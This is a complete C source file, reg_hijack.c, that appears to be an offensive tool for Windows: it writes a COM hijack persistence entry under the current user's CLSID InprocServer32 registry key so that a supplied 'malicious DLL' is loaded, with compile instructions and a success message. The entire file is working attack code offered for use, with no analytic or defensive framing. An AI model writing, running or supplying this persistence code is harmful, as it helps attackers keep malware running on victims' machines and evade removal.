/*
 * reg_hijack.c (final enhanced)
 *
 * Creates a COM hijack persistence entry by writing to:
 *   HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32
 * Argument 1: CLSID (in the form "{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}")
 * Argument 2: Full path to malicious DLL (must be signed or loadable).
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc reg_hijack.c -o reg_hijack.exe
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tchar.h>

int wmain(int argc, wchar_t *argv[])
{
    if (argc != 3) {
        fwprintf(stderr, L"Usage: %s <CLSID> <path_to_dll>\n", argv[0]);
        return 1;
    }

    LPCWSTR clsid = argv[1];
    LPCWSTR dllPath = argv[2];
    wchar_t subkey[256];
    HKEY hKey;
    LONG res;

    /* Validate CLSID string: must start with '{' and end with '}' */
    if (clsid[0] != L'{' || clsid[wcslen(clsid) - 1] != L'}') {
        fwprintf(stderr, L"Invalid CLSID format: %s\n", clsid);
        return 1;
    }

    /* Validate DLL path exists */
    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
        fwprintf(stderr, L"DLL path not found: %s\n", dllPath);
        return 1;
    }

    /* Build registry subkey: "Software\\Classes\\CLSID\\{...}\\InprocServer32" */
    if (swprintf(subkey, sizeof(subkey)/sizeof(wchar_t),
                 L"Software\\Classes\\CLSID\\%s\\InprocServer32", clsid) < 0) {
        fwprintf(stderr, L"Failed to format registry subkey\n");
        return 1;
    }

    /* Create or open the key */
    res = RegCreateKeyExW(HKEY_CURRENT_USER, subkey, 0, NULL,
                          REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (res != ERROR_SUCCESS) {
        fwprintf(stderr, L"RegCreateKeyExW failed: %ld\n", res);
        return 1;
    }

    /* Set default value to DLL path */
    res = RegSetValueExW(hKey, NULL, 0, REG_SZ,
                         (const BYTE *)dllPath,
                         (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));
    if (res != ERROR_SUCCESS) {
        fwprintf(stderr, L"RegSetValueExW failed: %ld\n", res);
        RegCloseKey(hKey);
        return 1;
    }

    RegCloseKey(hKey);
    wprintf(L"[+] Registry persistence created:\n    HKCU\\%s\n    => %s\n", subkey, dllPath);
    return 0;
}
